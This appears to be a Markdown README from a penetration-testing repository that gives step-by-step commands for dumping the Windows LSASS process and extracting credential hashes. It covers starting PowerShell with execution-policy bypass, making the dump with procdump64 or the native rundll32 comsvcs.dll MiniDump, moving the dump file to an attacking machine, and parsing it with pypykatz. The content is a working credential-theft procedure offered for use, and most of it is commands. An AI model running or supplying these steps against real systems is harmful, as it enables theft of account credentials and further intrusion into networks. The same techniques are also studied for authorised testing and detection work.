- - -
- Don't need mimikatz. 
- You can now dump hashes from LSASS by abusing LSASS process and generate a **lsass.dmp** file.
- After that we will use **pypykatz** to extarct the hashes from **lsass.dmp** file.

- - -
# Exploitation 🔫 : 

## Method-1 😎: 

> [!note]
> First we must have an **administrative privilege** to carry this attack.

Upload [procdump64.exe](https://github.com/k4sth4/lsass-dump/blob/main/procdump64.exe) to target machine.

#### Execute Powershell : 

```
powershell.exe -ep bypass
```

#### Get te lassa process id : 

```
get-process lsass
```

![Imgur](https://i.imgur.com/35x2OrK.png)

In this case **596** is the lsass process ID.
Execute it with [procdump64.exe](https://github.com/k4sth4/lsass-dump/blob/main/procdump64.exe) and generate a file contain hashes.

#### Dumping Hashes into a file : 

```
.\procdump64.exe -accepteula -ma 596 lsass.dmp
```

- - -
## Method-2 🥵 : 
We can also use **native DLLs** instead of **procdump64.exe**.
This way **we don't have to upoad anything** on target machine.

```powershell
// This whole is a "single-command" : 
C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 596 C:\\Users\\Bob\\Desktop\\lsass.dmp full
```

![Imgur](https://i.imgur.com/H7c1zUk.png)

Tansfer "**lsass.dmp**" to Attacking Machine.

![Imgur](https://i.imgur.com/nnoVV83.png)

#### Using Pypykatz : 
After downloading that **lsass.dmp** file to our attacking machine, now we can exctract the hashes using pypykatz.

```
pypykatz lsa minidump lsass.dmp
```

![Imgur](https://i.imgur.com/ysoJne8.png)

- - -




